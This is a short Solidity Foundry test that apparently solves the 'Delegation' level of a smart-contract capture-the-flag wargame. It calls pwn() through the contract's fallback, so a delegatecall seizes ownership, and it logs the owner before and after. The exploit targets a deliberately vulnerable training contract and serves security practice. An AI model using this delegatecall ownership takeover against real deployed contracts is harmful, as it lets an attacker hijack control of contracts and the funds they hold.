// SPDX-License-Identifier: MIT
pragma solidity ^0.8.17;

import "forge-std/Test.sol";
import {Delegate, Delegation} from "../instances/Ilevel06.sol";

contract Attacker is Test {
    Delegate delegate = new Delegate(msg.sender);
    Delegation delegation = new Delegation(address(delegate));

    function test() external {
        vm.startBroadcast();
        console.log("Current owner is: ", delegation.owner());
        (bool success, ) = address(delegation).call(
            abi.encodeWithSignature("pwn()")
        ); // triggering callback with my msg.data
        console.log("Checking delegatecall result : ", success); // checking result for delegatecall
        console.log("New owner is : ", delegation.owner()); // confirming new owner
        vm.stopBroadcast();
    }
}
